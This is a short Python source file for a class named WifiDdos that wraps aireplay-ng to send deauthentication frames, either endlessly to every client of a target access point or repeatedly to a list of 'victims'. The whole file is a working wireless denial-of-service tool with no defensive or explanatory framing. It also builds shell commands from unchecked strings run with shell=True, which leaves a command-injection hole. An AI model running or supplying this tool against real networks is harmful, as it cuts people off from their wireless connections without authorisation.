
import subprocess
import signal
import sys



class WifiDdos:

    def __init__(self):
        self.network = ""
        self.victims = []
        self.interface = "wlan1mon"

    def signal_handler(self, signal, frame):
        print("\nYou pressed Ctrl+C!")
        sys.exit(0)

    def deauth_all_clients(self, net):
        command = "aireplay-ng --deauth 0 -a {0} {1}".format(net, self.interface)
        print("[+] Deauthenticating all clients in the network")
        print("[!] You may as well run aireplay-ng directly: [{0}]\n".format(command))
        subprocess.call([command], shell=True) #Runs forever

    def deauth_client(self, net, cli):
        print("\n[+] Deauthenticating {0}\n".format(cli))
        command = "aireplay-ng --deauth 3 -a {0} -c {1} {2}".format(net, cli, self.interface)
        subprocess.call([command], shell=True)

    def start(self):
        signal.signal(signal.SIGINT, self.signal_handler)
        print("[+] Target Network:\n\t{0}".format(self.network))

        if len(self.victims) == 0:
            self.deauth_all_clients(self.network)
            sys.exit(1)

        print("[+] Target Clients:")
        for i in range(0, len(self.victims)):
            print("\t{0}".format(self.victims[i]))
        while True:
            for i in range(0, len(self.victims)):
                self.deauth_client(self.network, self.victims[i])
